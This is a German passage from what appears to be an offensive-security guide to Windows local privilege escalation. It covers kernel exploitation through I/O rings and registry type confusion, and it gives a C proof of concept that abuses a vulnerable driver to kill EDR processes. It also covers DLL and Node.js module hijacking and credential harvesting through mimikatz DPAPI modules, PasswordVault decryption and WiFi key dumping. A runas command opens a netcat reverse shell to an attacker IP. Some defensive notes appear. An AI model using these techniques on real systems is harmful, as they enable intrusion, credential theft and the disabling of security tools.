- **Refill-Ziele mit vielen Pointern**: Registrierte Buffer-Arrays von Windows-**I/O-Ringen** sind hervorragende Ziele für Offenlegungen, da sich ihre paged-pool-Größe vom Angreifer kontrollieren lässt (`8 * regBufferCnt`) und jedes Element ein Kernel-Pointer auf einen `_IOP_MC_BUFFER_ENTRY` ist. Leake eines dieser Arrays, ermittle das umgebende `IORING_OBJECT` und korrumpiere dann **`RegBuffers`** und **`RegBuffersCount`**, damit nachfolgende I/O-Ring-Operationen vom Angreifer gefälschte Einträge verwenden und beliebige Kernel-Read/Write-Operationen ermöglichen. Wenn der einzige verfügbare Write dir ein stabiles Byte liefert (zum Beispiel aus `KUSER_SHARED_DATA+0x14`), verwende **überlappende, nicht ausgerichtete Writes**, um einen User-Pointer aus wiederholten Bytes wie `0x0101010101010101` zu erzeugen, mappe ihn mit `VirtualAlloc` und lege das gefälschte Array registrierter Buffer dort ab.<sup>[[30]](#references)</sup>

Nützliche Debugging-Indikatoren:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Sobald du über den beschädigten I/O-Ring beliebiges Kernel-Read/Write erlangt hast, stiehl mit dem üblichen Post-Primitive-Workflow ein SYSTEM-Token:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives zur Speicherbeschädigung in Registry-Hives

Moderne Hive-Schwachstellen ermöglichen es, deterministische Speicherlayouts vorzubereiten, beschreibbare HKLM/HKU-Unterobjekte auszunutzen und Metadatenkorruption ohne benutzerdefinierten Treiber in Kernel-Paged-Pool-Overflows umzuwandeln. Hier findest du die vollständige Angriffskette:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Typverwechslung im Direct-Modus von `RtlQueryRegistryValues` durch vom Angreifer kontrollierte Pfade

Manche Treiber akzeptieren einen Registry-Pfad aus dem Userland, prüfen lediglich, ob es sich um eine gültige UTF-16-Zeichenfolge handelt, und rufen dann `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` mit `RTL_QUERY_REGISTRY_DIRECT` und einem skalaren Stack-Ziel wie `int readValue` auf. Fehlt `RTL_QUERY_REGISTRY_TYPECHECK`, wird `EntryContext` entsprechend dem **tatsächlichen** Registry-Typ interpretiert und nicht entsprechend dem vom Entwickler erwarteten Typ.

Dadurch entstehen zwei nützliche Primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused Deputy / Oracle**: Ein vom Benutzer kontrollierter absoluter `\Registry\...`-Pfad ermöglicht es dem Treiber, vom Angreifer ausgewählte Schlüssel abzufragen, deren Existenz über Rückgabecodes/Logs zu leaken und manchmal Werte auszulesen, auf die der Aufrufer nicht direkt zugreifen könnte.
- **Kernel-Speicherbeschädigung**: Ein skalares Ziel wie `&readValue` wird je nach Registry-Werttyp als `REG_QWORD`, `UNICODE_STRING` oder Puffer mit fester Größe typverwechselt.

Hinweise zur praktischen Ausnutzung:

- **Windows-8+-Mitigation**: Trifft die Abfrage auf eine **nicht vertrauenswürdige Hive** mit `RTL_QUERY_REGISTRY_DIRECT`, aber ohne `RTL_QUERY_REGISTRY_TYPECHECK`, stürzen Kernel-Aufrufer mit `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ab. Um die Ausnutzbarkeit zu erhalten, suche nach **vom Angreifer beschreibbaren Schlüsseln in vertrauenswürdigen System-Hives**, statt Werte unter `HKCU` abzulegen.
- **Bereitstellung in einer vertrauenswürdigen Hive**: Verwende NtObjectManager, um beschreibbare Unterobjekte von `\Registry\Machine` aufzulisten, und führe den Scan mit einem duplizierten **low-integrity**-Token erneut aus, um Schlüssel zu finden, die aus Sandbox-Kontexten erreichbar sind:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: Ein direkter Schreibzugriff über 8 Byte in ein 4-Byte-`int` beschädigt benachbarte Stack-Daten und kann einen nahegelegenen Callback-/Funktionszeiger teilweise überschreiben.
- **`REG_SZ` / `REG_EXPAND_SZ`**: Im direkten Modus muss `EntryContext` auf eine `UNICODE_STRING` zeigen. Lädt der Code zuerst ein angreiferkontrolliertes `REG_DWORD` in einen skalaren Wert auf dem Stack und verwendet dann denselben Puffer erneut für einen String-Lesezugriff, kontrolliert der Angreifer `Length`/`MaximumLength` und beeinflusst teilweise den `Buffer`-Zeiger. Dadurch entsteht ein teilweise kontrollierter Kernel-Schreibzugriff.
- **`REG_BINARY`**: Bei großen Binärdaten behandelt der direkte Modus das erste `LONG` an `EntryContext` als vorzeichenbehaftete Puffergröße. Hinterlässt ein vorheriger `REG_DWORD`-Lesezugriff einen **negativen**, angreiferkontrollierten Wert im wiederverwendeten Skalar, kopiert die nächste `REG_BINARY`-Abfrage Angreifer-Bytes direkt über benachbarte Stack-Slots. Das ist oft der einfachste Weg, einen Callback-Zeiger vollständig zu überschreiben.

Effektives Suchmuster: **heterogene Registry-Lesezugriffe in dieselbe Stack-Variable, ohne sie neu zu initialisieren**. Suche nach `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, wiederverwendeten `EntryContext`-Zeigern und Codepfaden, bei denen der erste Registry-Lesezugriff bestimmt, ob ein zweiter erfolgt.

#### Missbrauch von fehlendem FILE_DEVICE_SECURE_OPEN bei Device-Objekten (LPE + EDR-Kill)

Einige signierte Treiber von Drittanbietern erstellen ihr Device-Objekt mit einer starken SDDL über IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL beim Öffnen des Geräts über einen Pfad mit einer zusätzlichen Komponente nicht durchgesetzt. So kann jeder unprivilegierte Benutzer über einen Namespace-Pfad wie diesen einen Handle erhalten:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Gerät öffnen kann, lassen sich die vom Treiber bereitgestellten privilegierten IOCTLs für LPE und Manipulation missbrauchen. Beispiele für in freier Wildbahn beobachtete Möglichkeiten:
- Handles mit Vollzugriff auf beliebige Prozesse zurückgeben (Token-Diebstahl / SYSTEM-Shell über DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter Raw-Disk-Lese-/Schreibzugriff (Offline-Manipulation, Persistenz-Tricks beim Booten).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR aus dem Userland über den Kernel beendet werden kann.

Minimales PoC-Muster (User Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigationen für Entwickler
- Setzen Sie beim Erstellen von Geräteobjekten, die durch eine DACL eingeschränkt werden sollen, immer FILE_DEVICE_SECURE_OPEN.
- Überprüfen Sie bei privilegierten Vorgängen den Kontext des Aufrufers. Führen Sie PP/PPL-Prüfungen durch, bevor Sie das Beenden eines Prozesses oder die Rückgabe von Handles zulassen.
- Beschränken Sie IOCTLs (Zugriffsmasken, METHOD_*, Eingabevalidierung) und ziehen Sie Broker-Modelle anstelle direkter Kernel-Privilegien in Betracht.

Erkennungsmöglichkeiten für Verteidiger
- Überwachen Sie Öffnungen verdächtiger Gerätenamen im User-Mode (z. B. \\ .\\amsdk*) und bestimmte IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts Sperrliste für anfällige Treiber durch (HVCI/WDAC/Smart App Control) und pflegen Sie eigene Zulassungs- und Sperrlisten.


## PATH DLL Hijacking

Wenn Sie **Schreibberechtigungen in einem Ordner haben, der in PATH enthalten ist**, können Sie möglicherweise eine DLL hijacken, die von einem Prozess geladen wird, und **Ihre Privilegien erweitern**.<sup>[[2]](#references)</sup>

Überprüfen Sie die Berechtigungen aller Ordner in PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Weitere Informationen dazu, wie dieser Check missbraucht werden kann:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking der Node.js- / Electron-Modulauflösung über `C:\node_modules`

Dies ist eine Variante des **nicht kontrollierten Windows-Suchpfads**, die **Node.js**- und **Electron**-Anwendungen betrifft, wenn sie einen einfachen Import wie `require("foo")` ausführen und das erwartete Modul **fehlt**.<sup>[[20]](#references)</sup>

Node löst Pakete auf, indem es den Verzeichnisbaum nach oben durchläuft und in jedem übergeordneten Verzeichnis `node_modules`-Ordner überprüft. Unter Windows kann dieser Weg bis zum Stammverzeichnis des Laufwerks führen. Daher kann eine Anwendung, die von `C:\Users\Administrator\project\app.js` gestartet wird, Folgendes überprüfen:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Wenn ein **Benutzer mit niedrigen Berechtigungen** `C:\node_modules` erstellen kann, kann er eine schädliche `foo.js`-Datei (oder einen Paketordner) platzieren und warten, bis ein **Node-/Electron-Prozess mit höheren Berechtigungen** die fehlende Abhängigkeit auflöst. Die Payload wird im Sicherheitskontext des Opferprozesses ausgeführt. Dadurch entsteht eine **LPE**, wenn das Ziel als Administrator, über eine erhöhte geplante Aufgabe/einen Dienst-Wrapper oder als automatisch gestartete privilegierte Desktop-Anwendung ausgeführt wird.

Dies kommt besonders häufig vor, wenn:

- eine Abhängigkeit in `optionalDependencies` deklariert ist<sup>[[22]](#references)</sup>
- eine Drittanbieterbibliothek `require("foo")` in `try/catch` einschließt und bei einem Fehler fortfährt
- ein Paket aus Produktions-Builds entfernt, beim Packaging ausgelassen oder nicht installiert wurde
- sich das anfällige `require()` tief im Abhängigkeitsbaum statt im Hauptanwendungscode befindet

### Anfällige Ziele aufspüren

Verwende **Procmon**, um den Auflösungspfad nachzuweisen:<sup>[[23]](#references)</sup>

- Filtere nach `Process Name` = Zielprogramm (`node.exe`, die EXE der Electron-App oder der Wrapper-Prozess)
- Filtere nach `Path` `contains` `node_modules`
- Konzentriere dich auf `NAME NOT FOUND` und den abschließenden erfolgreichen Zugriff auf `C:\node_modules`

Nützliche Muster bei Code-Reviews in entpackten `.asar`-Dateien oder im Anwendungscode:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Ermittle den **fehlenden Paketnamen** mithilfe von Procmon oder durch Prüfung des Quellcodes.
2. Erstelle das Stammverzeichnis für die Suche, falls es noch nicht existiert:

```powershell
mkdir C:\node_modules
```

3. Lege ein Modul mit dem exakt erwarteten Namen ab:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Lösen Sie die Anwendung des Opfers aus. Wenn die Anwendung `require("foo")` aufruft und das legitime Modul fehlt, lädt Node möglicherweise `C:\node_modules\foo.js`.

Reale Beispiele für fehlende optionale Module, die diesem Muster entsprechen, sind `bluebird` und `utf-8-validate`. Die wiederverwendbare **Technik** besteht jedoch darin, einen beliebigen **fehlenden Bare Import** zu finden, den ein privilegierter Windows-Node/Electron-Prozess auflösen wird.

### Erkennungs- und Härtungsideen

- Alarmieren, wenn ein Benutzer `C:\node_modules` erstellt oder dort neue `.js`-Dateien/Packages ablegt.
- Nach Prozessen mit hoher Integrität suchen, die aus `C:\node_modules\*` lesen.
- Alle Runtime-Abhängigkeiten in der Produktionsumgebung paketieren und die Verwendung von `optionalDependencies` überprüfen.
- Drittanbieter-Code auf Muster wie `try { require("...") } catch {}` überprüfen, die Fehler stillschweigend abfangen.
- Optionale Prüfungen deaktivieren, wenn die Bibliothek dies unterstützt (bei manchen `ws`-Deployments lässt sich beispielsweise die veraltete `utf-8-validate`-Prüfung mit `WS_NO_UTF_8_VALIDATE=1` vermeiden).

## Netzwerk

### Freigaben

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Hosts-Datei

Prüfe, ob weitere bekannte Computer fest in der Hosts-Datei eingetragen sind.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Netzwerkschnittstellen & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Offene Ports

Prüfe von außen auf **eingeschränkte Dienste**

```bash
netstat -ano #Opened ports?
```

Für einen lokalen Listener solltest du seine PID dem Prozesseigentümer, dem ausführbaren Pfad und dem Dienst oder der geplanten Aufgabe zuordnen, die ihn startet. Ein Remote-Control-Dienst kann nur dann Zugriff als sein Desktop-Benutzer ermöglichen, wenn seine Authentifizierungs- und Befehlssteuerungen dies zulassen. Eine benutzerdefinierte TCP-Anwendung, die mit einem Konto mit höheren Berechtigungen ausgeführt wird, ist ein separates Prüfziel: Der Listener und der Binärpfad sind passive Hinweise, während ein authentifizierter Weg über eine Speicherkorruption die Analyse genau dieser Binärdatei und ihrer erreichbaren Eingabe erfordert. Scheint ein offener Port zu einem Systemprozess zu gehören, vergleiche ihn mit [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), bevor du den Backend-Dienst zuordnest; eine Weiterleitungsregel allein beweist nicht, dass das Ziel erreichbar oder verwundbar ist.

### Routingtabelle

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP-Tabelle

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall-Regeln

[**Auf dieser Seite findest du Befehle rund um die Firewall**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Weitere[ Befehle zur Netzwerkerkundung findest du hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Die Binärdatei `bash.exe` ist auch unter `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` zu finden.

Wenn du root bist, kannst du auf jedem Port lauschen (beim ersten Mal, wenn du `nc.exe` zum Lauschen auf einem Port verwendest, wirst du über eine GUI gefragt, ob `nc` von der Firewall zugelassen werden soll).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Um `bash` einfach als root zu starten, kannst du `--default-user root` ausprobieren.

Du kannst das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` durchsuchen.

`root` unter Linux innerhalb von WSL gewährt für sich allein keine Windows-Administratorrechte. Wenn die aktuelle Windows-Identität auf das Dateisystem einer Distribution zugreifen kann, überprüfe Shell-Verlaufsdateien (einschließlich `/root/.bash_history`) auf Befehle, in denen möglicherweise Anmeldedaten gespeichert wurden. Für eine Rechteausweitung ist weiterhin ein gültiges Konto mit höheren Berechtigungen und ein zulässiger Authentifizierungsweg erforderlich. Die Verzeichnisstruktur `LocalState\rootfs` gilt für ältere WSL-Installationen. WSL 2 speichert die Distribution häufig auf einer [`ext4.vhdx`-virtuellen Festplatte](https://learn.microsoft.com/en-us/windows/wsl/disk-space). Ermittle daher zuerst die tatsächliche Distribution und den Speicherpfad. Vermeide es, Verlaufsinhalte bei der automatisierten Aufzählung auszugeben.

## Windows-Anmeldedaten

### Winlogon-Anmeldedaten

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Behandle `DefaultUserName` und `DefaultDomainName` als Account-Kontext, nicht als Zugangsdaten. Ein nicht leerer Wert für `DefaultPassword` oder `AltDefaultPassword` ist ein Klartextfund in der Registry. Wenn `AutoAdminLogon=1` gesetzt ist, aber kein Klartextpasswort lesbar ist, ist das lediglich ein Hinweis: [Sysinternals Autologon kann das Passwort als LSA secret speichern](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), und gewöhnliche Registry-Abfragen belegen weder, ob dieses Secret existiert, noch ob es abgerufen werden kann. Prüfe die Zugriffsrechte und die tatsächliche Anmeldekonfiguration, bevor du eine Offenlegung von Zugangsdaten meldest.

### Anmeldeinformationsverwaltung / Windows-Tresor

Aus [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, mit denen **Windows** **Benutzer automatisch anmelden** kann. Zunächst könnte es so klingen, als könnten Benutzer Anmeldeinformationen für Websites wie Facebook, Twitter oder Gmail speichern und sich dann automatisch über Browser anmelden. So funktioniert es jedoch nicht.

Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann. Das bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen für den Zugriff auf eine Ressource** (einen Server oder eine Website) **benötigt, diesen Credential Manager** und Windows Vault verwenden und die bereitgestellten Anmeldeinformationen nutzen kann, anstatt dass Benutzer jedes Mal den Benutzernamen und das Passwort eingeben müssen.

Wenn Anwendungen nicht mit dem Credential Manager interagieren, können sie meiner Meinung nach die Anmeldeinformationen für eine bestimmte Ressource nicht verwenden. Wenn deine Anwendung also den Tresor nutzen soll, muss sie irgendwie **mit dem Credential Manager kommunizieren und die Anmeldeinformationen für diese Ressource** aus dem standardmäßigen Speichertresor anfordern.

Verwende `cmdkey`, um die gespeicherten Anmeldeinformationen auf dem Computer aufzulisten.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldedaten zu nutzen. Das folgende Beispiel ruft eine Remote-Binärdatei über eine SMB-Freigabe auf.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldedaten.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oder das [Empire Powershells-Modul](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) verwendet werden können.

### UWP PasswordVault / Credential Locker

Moderne Windows-UWP-Anwendungen, Microsoft Edge und moderne Systemdienste speichern Authentifizierungstoken und Klartextpasswörter im `PasswordVault` der Universal Windows Platform (UWP) (in `vaultcmd` auch als `Web Credentials` verfügbar). Dieser Speicherbereich ist sitzungsisoliert und kann nativ entschlüsselt werden, ohne Administratorrechte oder `SeDebugPrivilege` zu benötigen.

Führe diesen PowerShell-Befehl in der aktiven Sitzung des Benutzers aus, um sofort alle gespeicherten Benutzernamen und Klartextpasswörter auszulesen und zu entschlüsseln:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten und wird überwiegend innerhalb des Windows-Betriebssystems zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet. Bei dieser Verschlüsselung wird ein Benutzer- oder Systemgeheimnis genutzt, um maßgeblich zur Entropie beizutragen.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln mithilfe eines symmetrischen Schlüssels, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. Bei der Systemverschlüsselung werden die Domänenauthentifizierungsgeheimnisse des Systems verwendet.

Verschlüsselte RSA-Schlüssel von Benutzern werden mithilfe von DPAPI im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` für den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers steht. **Der DPAPI-Schlüssel, der sich zusammen mit dem Hauptschlüssel zum Schutz der privaten Schlüssel des Benutzers in derselben Datei befindet**, besteht in der Regel aus 64 Bytes zufälliger Daten. (Beachten Sie, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist und seine Inhalte daher nicht mit dem Befehl `dir` in CMD aufgelistet werden können, wohl aber mit PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Du kannst das **mimikatz module** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **durch das Master-Passwort geschützten Anmeldedatendateien** befinden sich normalerweise unter:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Du kannst das **mimikatz-Modul** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Mit dem Modul `sekurlsa::dpapi` kannst du viele **DPAPI**-**Masterkeys** aus dem **Arbeitsspeicher** extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell-Anmeldedaten

**PowerShell-Anmeldedaten** werden häufig für **Skripterstellung** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldedaten bequem zu speichern. Die Anmeldedaten sind durch **DPAPI** geschützt. Das bedeutet in der Regel, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.

Eine exportierte Anmeldeinformation kann einen beliebigen Dateinamen oder einen `.xml`-Pfad haben. Wenn ein Skript oder eine Dateiinventarisierung darauf hinweist, ermittle das tatsächliche Profilverzeichnis des Kontos, statt `C:\Users` anzunehmen: [Windows kann Profile an anderen Orten speichern](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Eine lesbare Datei ist lediglich ein Hinweis; [Windows `Export-Clixml` bindet eine verschlüsselte Anmeldeinformation an den exportierenden Benutzer und Computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), und jedes wiederhergestellte Konto muss außerdem über gültige Berechtigungen für den vorgesehenen Dienst verfügen. Prüfe zunächst Pfade und ACLs, ohne bei der routinemäßigen Enumeration verschlüsselte oder unverschlüsselte Werte auszugeben.

Um PowerShell-Anmeldedaten aus der Datei zu **entschlüsseln**, die sie enthält, kannst du Folgendes ausführen:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### WLAN

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Gespeicherte RDP-Verbindungen

Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
und unter `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Kürzlich ausgeführte Befehle

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Anmeldeinformationsverwaltung für Remotedesktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use das **Mimikatz**-Modul `dpapi::rdg` mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Mit dem Mimikatz-Modul `sekurlsa::dpapi` kannst du **viele DPAPI masterkeys aus dem Arbeitsspeicher extrahieren**

**mRemoteNG verwendet einen anderen Verbindungsspeicher.** Untersuche lesbare XML-Dateien unter `%APPDATA%\mRemoteNG` und in den Benutzerordnern „Dokumente“, auch Dateien mit gewöhnlichen Namen wie `config.xml`. Ermittle das Verbindungsschema und verschlüsselte `Password`-Attribute, bevor du eine XML-Datei als möglichen Zugangsdatenfund behandelst. Der gespeicherte Wert ist kein DPAPI/RDCMan-Passwort; die Wiederherstellung hängt von den Verschlüsselungseinstellungen der Datei und davon ab, ob ein benutzerdefiniertes Master-Passwort verwendet wurde. Gib bei einer breiten Suche verschlüsselte Werte nicht aus.

**Remote Desktop Plus-Profil-Exporte** können ebenfalls in Benutzerverzeichnissen oder einem freigegebenen Administrationsordner lesbar sein. Ein älterer `profiles.xml`-Export enthält `Data/Profile`-Einträge mit den Elementen `ProfileName`, `Password` und `Secure`. Behandle ein nicht leeres Passwortelement als möglichen Zugangsdatenfund, ohne es auszugeben oder anzunehmen, dass es im Klartext vorliegt: [laut Angaben des Anbieters](https://www.donkz.nl/) kann der Profilschutz an das erstellende Konto und den Computer gebunden oder weniger streng konfiguriert sein. Überprüfe Herkunft und Wiederherstellungsbedingungen der Datei, bevor du dich darauf verlässt.

### Sticky Notes

Viele verwenden die Sticky Notes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu **speichern**, ohne zu wissen, dass sie in einer Datenbankdatei abgelegt werden. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und sollte immer gesucht und untersucht werden.

Manche speichern Passwörter und andere Informationen in Haftnotiz-Apps. Die als Microsoft-Paket bereitgestellte Sticky Notes-App speichert Notizen üblicherweise unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; ältere oder andere Apps können andere Speicherorte im Benutzerprofil verwenden, darunter LevelDB. Ermittle die installierte App und das Speicherformat, bevor du aus einer fehlenden SQLite-Datei schließt, dass keine Notizen vorhanden sind.

Wenn Sticky Notes SQLite write-ahead logging verwendet, kann eine Kopie von `plum.sqlite` allein kürzlich bestätigte Notizen auslassen. Bewahre `plum.sqlite-wal` zusammen mit einer konsistenten Kopie der Datenbank auf und füge, falls verfügbar, auch `plum.sqlite-shm` hinzu; der Shared-Memory-Index kann neu erstellt werden, aber die WAL gehört zum persistenten Zustand der Datenbank. Siehe [die WAL-Dokumentation von SQLite](https://www.sqlite.org/wal.html). Eine Notiz mit einem Kontonamen oder Passwort ist lediglich ein möglicher Zugangsdatenfund: Überprüfe das Konto, die zulässigen Zugriffsrechte und die Wiederverwendung des Passworts separat. Ein verschlüsselter Eintrag aus einem Passwortmanager erfordert außerdem den tatsächlichen Entschlüsselungsschlüssel und eine anwendungsspezifische Interpretation, bevor er als Nachweis für eine Anmeldung mit höheren Berechtigungen dienen kann.

### AppCmd.exe

**Beachte, dass du Administrator sein und mit einem High-Integrity-Level arbeiten musst, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise einige **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
